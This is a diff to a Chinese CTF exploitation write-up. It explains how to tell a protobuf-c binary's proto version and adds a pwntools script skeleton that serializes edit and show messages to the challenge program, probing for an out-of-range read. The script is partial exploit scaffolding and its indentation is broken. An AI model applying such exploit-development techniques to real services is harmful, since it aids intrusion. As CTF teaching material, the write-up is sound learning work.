@@ -359,4 +359,36 @@ message message_request{
     required int32 actionid = 5;
 }
 ```
-syntax的版本需查看ProtobufCFieldDescriptor结构体中是否有default_value字段，proto3中shan chu l
+syntax的版本需查看ProtobufCFieldDescriptor结构体中是否有default_value字段，proto3中删除了default_value字段，可以根据字段数量来判断proto版本。
+有了proto后将其编译，可以得到一个py文件，然后就可以在exp中引用他来和程序交互了
+```python
+from pwn import *
+import de_pb2
+def edit(id, len, content):
+message = de_pb2.message_request()
+message.sender = 'admin'
+message.len = len
+message.content = content
+message.actionid = 1
+message.id = id
+data = message.SerializeToString()
+p.sendafter(b'TESTTESTTEST!', data)
+
+def show(id):
+message = de_pb2.message_request()
+message.sender = 'admin'
+message.len = 1
+message.content = b'hello'
+message.actionid = 2
+message.id = id
+data = message.SerializeToString()
+p.sendafter(b'TESTTESTTEST!', data)
+
+debug()
+
+edit(0, 8, b'deadbeef')
+
+edit(1, 8, b'deadbeef')
+
+show(2)
+```
